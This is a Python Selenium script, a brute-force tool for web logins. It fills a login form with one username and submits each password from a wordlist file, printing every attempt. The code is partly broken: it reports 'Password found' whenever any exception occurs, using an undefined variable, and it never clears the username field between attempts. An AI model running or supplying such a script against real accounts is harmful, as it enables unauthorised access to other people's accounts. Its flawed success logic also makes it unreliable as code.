from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import string
import time
import sys

def initialize_driver(URL):
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)
    driver.get(URL)
    driver.delete_all_cookies()
    return driver

def find_email_field(driver):
    return driver.find_element(By.CSS_SELECTOR, '#form_username')

def find_password_field(driver):
    return WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.CSS_SELECTOR, '#form_password'))
    )

def find_submit_button(driver):
    return WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.CSS_SELECTOR, '#form_submit'))
    )

start_time = time.time()

def attack(URL, email_value, password_file):
    try:
        driver = initialize_driver(URL=URL)
        test_counter = 0

        with open(password_file, 'r') as passwords:
            for line in passwords:
                password = line.strip()
                email_field = find_email_field(driver)
                email_field.send_keys(email_value)

                password_field = find_password_field(driver)
                password_field.clear()
                password_field.send_keys(password)

                submit_button = find_submit_button(driver)
                submit_button.click()

                end_time = time.time()
                time_taken = end_time - start_time

                print(f"URL: {URL} - User ID: {email_value} - Login password: {password} - Time: {time_taken:.2f} seconds")

                test_counter += 1

                if test_counter >= 10000:
                    driver.quit()
                    driver = initialize_driver(URL=URL)
                    test_counter = 0

    except Exception as e:
        print(f"Password found: {last_password}")
    finally:
        if 'driver' in locals():
            driver.quit()

# Example usage
if __name__ == "__main__":
    url = 'https://example.com/login'
    email = 'Username'
    password_list_file = 'full_password_list.txt'
    attack(url, email, password_list_file)
